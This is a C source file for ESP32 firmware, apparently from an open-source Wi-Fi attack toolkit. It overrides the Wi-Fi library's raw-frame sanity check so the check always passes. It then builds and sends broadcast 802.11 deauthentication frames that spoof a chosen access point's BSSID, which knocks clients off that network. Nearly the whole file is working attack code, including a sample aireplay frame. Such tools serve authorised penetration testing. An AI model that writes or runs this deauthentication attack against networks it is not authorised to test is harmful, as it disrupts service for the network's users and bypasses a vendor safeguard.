/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,                 // Frame control
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // MAC destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Unused address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // MAC source
    0xf0, 0xff, 0x02, 0x00                  // Reason code
};

// static const uint8_t deauth_frame_test[] = {
//     0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, 0xc0, 0x00,
//     0xaa, 0xaa, 
//     0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
//     // /*
//     0xaa, 0xf0, 0x95, 0x59, 0x47, 0xd8, 
//     0xaa, 0xf0, 0x95, 0x59, 0x47, 0xd8, 
//     // */
//     /*
//     0x62, 0x87, 0x0f, 0xa9, 0x62, 0x78,
//     0x62, 0x87, 0x0f, 0xa9, 0x62, 0x78,
//     */

//     0x00, 0x00, 0x07, 0x00
// };

/*
Example aireplay frame:
\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\xaa\xaa\xff\xff\xff\xff\xff\xff\xaa\xf0\x95\x59\x47\xd8\xaa\xf0\x95\x59\x47\xd8\x00\x00\x07\x00

RADIOTAP:
\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00

802.11:
\xc0\x00\x01
\xff\xff\xff\xff\xff\xff
\xaa\xf0\x95\x59\x47\xd8
\xaa\xf0\x95\x59\x47\xd8
\x00\x00\x07\x00
*/


/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    ESP_LOGI(TAG, "Sending deauth");
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
    return;
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGI(TAG, "Sending deauth frame to: %p", ap_record);
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

    //wsl_bypasser_send_raw_frame(deauth_frame_test, sizeof(deauth_frame_test));
    
    return;
}